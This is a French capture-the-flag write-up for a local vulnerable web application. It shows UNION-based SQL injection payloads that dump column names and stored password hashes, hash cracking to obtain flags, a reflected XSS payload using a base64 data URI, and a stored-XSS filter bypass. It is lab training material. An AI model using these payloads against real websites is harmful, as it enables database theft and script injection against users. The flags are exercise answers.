# CTF

# Pentest sur machine vulnérable

## 1 search_image_sql_inj_union

Se rendre sur la machine vulnérable : [http://192.168.0.116](http://192.168.0.116) puis de cliquer sur “Search image”

Test de l’injection sql :

```sql
1 UNION SELECT 1,2
```

Resultat obtenu :

```sql
ID : 1 UNION SELECT 1,2
Title : 2
Url : 1
```

Extraction des colonnes : 

```sql
1 UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
```

Resultat obtenu :

```sql
Title: id,url,title,comment
```

Extraction de toutes les donnée :

```sql
1 UNION SELECT title,comment FROM Member_images.list_images
```

Resultats obtenu : 

```sql
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url: Hack me ?
```

Le mot de passe décrypter est : albatroz . Puis converti en sha256 : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Voici le flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## 2 search_member_sql_inj_error_based

Test de l’injection SQL :

```sql
1 UNION SELECT 1,2
```

Resultat obtenu :

```sql
ID: 1, First name: one, Surname: me
ID: 1 UNION SELECT 1,2, First name: 1, Surname: 2
```

Lister les tables de la bd :

```sql
1 UNION SELECT table_name,table_schema FROM information_schema.tables
```

Extraction des noms de colonnes :

```sql
1 UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273
```

Resultat :

```sql
Surname: user_id,first_name,last_name,town,country,planet,Commentaire,countersign
```

Extraction des données sensibles :

```sql
1 UNION SELECT Commentaire,countersign FROM Member_Sql_Injection.users
```

Resultat : 

```sql
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

Après toutes conversion le flag est : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## 3 xss_reflected_media

Test d’injection : 

```bash
http://192.168.0.116/?page=media&src=test
```

Resultat : 

```html
<object data="test"></object>
```

**Aller sur CyberChef**

Ouvrir un nouvel onglet puis aller sur: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

**Configurer l'encodage**

Dans la barre de recherche à gauche, taper: `To Base64`

Cliquer sur "To Base64" pour l'ajouter à la recette

Exploitation de la faille : 

```html
http://192.168.0.116/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
```

Le flag est : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

## 4 xss_stored_feedback

Test injection :

```html
° Name : test
° Message : <script>alert(1)</script>
```

Resultat : 

```html
Name: test
Comment: alert(1)
```

Filtre sur les balises <script>

Exploitation de la faille :

```html
° Name : script
° Message : test
```

Le flag est : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e